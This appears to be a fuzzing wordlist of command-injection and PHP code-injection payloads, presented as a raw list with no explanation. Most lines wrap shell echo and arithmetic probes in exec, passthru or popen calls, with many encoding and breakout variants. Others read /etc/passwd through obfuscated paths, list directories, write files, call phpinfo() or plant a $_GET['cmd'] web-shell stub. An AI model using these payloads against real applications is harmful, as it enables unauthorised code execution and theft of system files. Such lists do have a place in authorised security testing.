$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
$(`cat /etc/passwd`)
$(`dir`)
$(echo SYCGSY > SYCGSY.txt)
${exec(print(`echo AOJPQW\necho $((18+92))\necho AOJPQW\necho AOJPQW`);%252529%25257DAOJPQW
${exec(print(`echo ASBMQM;echo $((65+46));echo ASBMQM;echo ASBMQM`);#ASBMQM
${exec(print(`echo BDBPSZ;echo $((87+50));echo BDBPSZ;echo BDBPSZ`);BDBPSZ
${exec(print(`echo BGHSSE`.`echo $((10+79))`.`echo BGHSSE`.`echo BGHSSE`);."BGHSSE
${exec(print(`echo CHWXXR;echo $((19+13));echo CHWXXR;echo CHWXXR`);.'CHWXXR
${exec(print(`echo CPYIZR%0aecho $((58+63))%0aecho CPYIZR%0aecho CPYIZR`);//CPYIZR
${exec(print(`echo GKZRWD`.`echo $((93+76))`.`echo GKZRWD`.`echo GKZRWD`);#GKZRWD
${exec(print(`echo GYABGY;echo $((9+52));echo GYABGY;echo GYABGY`);."GYABGY
${exec(print(`echo HFMDNB%0aecho $((56+41))%0aecho HFMDNB%0aecho HFMDNB`);.%2522HFMDNB
${exec(print(`echo HIUMZJ`.`echo $((69+37))`.`echo HIUMZJ`.`echo HIUMZJ`);HIUMZJ
${exec(print(`echo IHGVIP;echo $((98+57));echo IHGVIP;echo IHGVIP`);)}IHGVIP
${exec(print(`echo ITAGSP\necho $((63+35))\necho ITAGSP\necho ITAGSP`);ITAGSP
${exec(print(`echo JFZDGZ`.`echo $((16+38))`.`echo JFZDGZ`.`echo JFZDGZ`);\\JFZDGZ
${exec(print(`echo JPKQMC\necho $((63+12))\necho JPKQMC\necho JPKQMC`);.%252527JPKQMC
${exec(print(`echo KTGGNJ\necho $((80+87))\necho KTGGNJ\necho KTGGNJ`);.%252522KTGGNJ
${exec(print(`echo LWNHYJ%0aecho $((0+21))%0aecho LWNHYJ%0aecho LWNHYJ`);%2529%257DLWNHYJ
${exec(print(`echo OHFTIA%0aecho $((97+31))%0aecho OHFTIA%0aecho OHFTIA`);.%2527OHFTIA
${exec(print(`echo QRLVMM\necho $((41+19))\necho QRLVMM\necho QRLVMM`);%25255C%25255CQRLVMM
${exec(print(`echo QTLCRD%0aecho $((90+5))%0aecho QTLCRD%0aecho QTLCRD`);%255C%255CQTLCRD
${exec(print(`echo SRPMSX`.`echo $((59+33))`.`echo SRPMSX`.`echo SRPMSX`))}SRPMSX
${exec(print(`echo TWZNTZ\necho $((85+67))\necho TWZNTZ\necho TWZNTZ`);%252523TWZNTZ
${exec(print(`echo UFJNMU\necho $((69+30))\necho UFJNMU\necho UFJNMU`);//UFJNMU
${exec(print(`echo UGDXMC`.`echo $((12+69))`.`echo UGDXMC`.`echo UGDXMC`);.'UGDXMC
${exec(print(`echo UVBBNB%0aecho $((5+32))%0aecho UVBBNB%0aecho UVBBNB`);UVBBNB
${exec(print(`echo UZNHTA%0aecho $((79+41))%0aecho UZNHTA%0aecho UZNHTA`);%2523UZNHTA
${exec(print(`echo XRESBN`.`echo $((9+10))`.`echo XRESBN`.`echo XRESBN`);//XRESBN
${exec(print(`echo YFVAOJ;echo $((71+65));echo YFVAOJ;echo YFVAOJ`);//YFVAOJ
${exec(print(`echo YYMYQB;echo $((54+65));echo YYMYQB;echo YYMYQB`);\\YYMYQB
;{$_GET["cmd"]}
$(`ls`)
${passthru(print(`echo CGIUOF`.`echo $((1+49))`.`echo CGIUOF`.`echo CGIUOF`);\\CGIUOF
${passthru(print(`echo CLQQRV;echo $((21+24));echo CLQQRV;echo CLQQRV`);CLQQRV
${passthru(print(`echo CSYNWP\necho $((93+10))\necho CSYNWP\necho CSYNWP`);.%252522CSYNWP
${passthru(print(`echo CYGOXX;echo $((41+31));echo CYGOXX;echo CYGOXX`);)}CYGOXX
${passthru(print(`echo DAORGO`.`echo $((65+75))`.`echo DAORGO`.`echo DAORGO`))}DAORGO
${passthru(print(`echo DBDIBN;echo $((7+5));echo DBDIBN;echo DBDIBN`);//DBDIBN
${passthru(print(`echo EGTRQH\necho $((17+5))\necho EGTRQH\necho EGTRQH`);.%252527EGTRQH
${passthru(print(`echo EWDATZ\necho $((58+44))\necho EWDATZ\necho EWDATZ`);//EWDATZ
${passthru(print(`echo FHTLVG%0aecho $((8+87))%0aecho FHTLVG%0aecho FHTLVG`);%2523FHTLVG
${passthru(print(`echo HRCXNG;echo $((6+10));echo HRCXNG;echo HRCXNG`);."HRCXNG
${passthru(print(`echo JRXXWA;echo $((92+68));echo JRXXWA;echo JRXXWA`);\\JRXXWA
${passthru(print(`echo KRUYIM%0aecho $((16+77))%0aecho KRUYIM%0aecho KRUYIM`);.%2522KRUYIM
${passthru(print(`echo KXVPHA%0aecho $((20+43))%0aecho KXVPHA%0aecho KXVPHA`);%255C%255CKXVPHA
${passthru(print(`echo NLYULT`.`echo $((55+80))`.`echo NLYULT`.`echo NLYULT`);NLYULT
${passthru(print(`echo NSBWMT%0aecho $((16+44))%0aecho NSBWMT%0aecho NSBWMT`);//NSBWMT
${passthru(print(`echo OAAISJ`.`echo $((72+52))`.`echo OAAISJ`.`echo OAAISJ`);#OAAISJ
${passthru(print(`echo OLJESC\necho $((53+40))\necho OLJESC\necho OLJESC`);%25255C%25255COLJESC
${passthru(print(`echo OSWWFT%0aecho $((92+42))%0aecho OSWWFT%0aecho OSWWFT`);%2529%257DOSWWFT
${passthru(print(`echo OVSNXT\necho $((21+17))\necho OVSNXT\necho OVSNXT`);%252529%25257DOVSNXT
${passthru(print(`echo PYELUB;echo $((29+64));echo PYELUB;echo PYELUB`);#PYELUB
${passthru(print(`echo QKCAAG%0aecho $((61+22))%0aecho QKCAAG%0aecho QKCAAG`);.%2527QKCAAG
${passthru(print(`echo QPYRBQ\necho $((35+79))\necho QPYRBQ\necho QPYRBQ`);%252523QPYRBQ
${passthru(print(`echo RBCHID`.`echo $((71+83))`.`echo RBCHID`.`echo RBCHID`);.'RBCHID
${passthru(print(`echo TYDNLL%0aecho $((23+29))%0aecho TYDNLL%0aecho TYDNLL`);TYDNLL
${passthru(print(`echo UOUNQT`.`echo $((2+66))`.`echo UOUNQT`.`echo UOUNQT`);."UOUNQT
${passthru(print(`echo XGEVDG`.`echo $((58+30))`.`echo XGEVDG`.`echo XGEVDG`);//XGEVDG
${passthru(print(`echo XUWNEP;echo $((61+20));echo XUWNEP;echo XUWNEP`);.'XUWNEP
${passthru(print(`echo ZKPFXS\necho $((3+17))\necho ZKPFXS\necho ZKPFXS`);ZKPFXS
{${phpinfo()}}
${popen(print(`echo AHQLIX%0aecho $((35+21))%0aecho AHQLIX%0aecho AHQLIX`);//AHQLIX
${popen(print(`echo ATLEFF;echo $((90+9));echo ATLEFF;echo ATLEFF`);\\ATLEFF
${popen(print(`echo BZEAYT%0aecho $((11+35))%0aecho BZEAYT%0aecho BZEAYT`);.%2527BZEAYT
${popen(print(`echo BZLGPL;echo $((70+63));echo BZLGPL;echo BZLGPL`);)}BZLGPL
${popen(print(`echo FJKMCS\necho $((43+2))\necho FJKMCS\necho FJKMCS`);.%252522FJKMCS
${popen(print(`echo FRWTRM;echo $((11+41));echo FRWTRM;echo FRWTRM`);."FRWTRM
${popen(print(`echo IWFPXG;echo $((92+70));echo IWFPXG;echo IWFPXG`);IWFPXG
${popen(print(`echo JDFWVW%0aecho $((92+86))%0aecho JDFWVW%0aecho JDFWVW`);%255C%255CJDFWVW
${popen(print(`echo KCHOPX\necho $((77+78))\necho KCHOPX\necho KCHOPX`);%252523KCHOPX
${popen(print(`echo LBEVLL`.`echo $((2+31))`.`echo LBEVLL`.`echo LBEVLL`))}LBEVLL
${popen(print(`echo LSIFOR%0aecho $((86+39))%0aecho LSIFOR%0aecho LSIFOR`);.%2522LSIFOR
${popen(print(`echo MVEAQD;echo $((64+58));echo MVEAQD;echo MVEAQD`);.'MVEAQD
${popen(print(`echo PBSYUK`.`echo $((49+23))`.`echo PBSYUK`.`echo PBSYUK`);//PBSYUK
${popen(print(`echo PBZYGX`.`echo $((38+4))`.`echo PBZYGX`.`echo PBZYGX`);."PBZYGX
${popen(print(`echo QDXUDJ\necho $((17+75))\necho QDXUDJ\necho QDXUDJ`);%252529%25257DQDXUDJ
${popen(print(`echo RWKSAH%0aecho $((18+34))%0aecho RWKSAH%0aecho RWKSAH`);RWKSAH
${popen(print(`echo RWZIYD\necho $((45+92))\necho RWZIYD\necho RWZIYD`);//RWZIYD
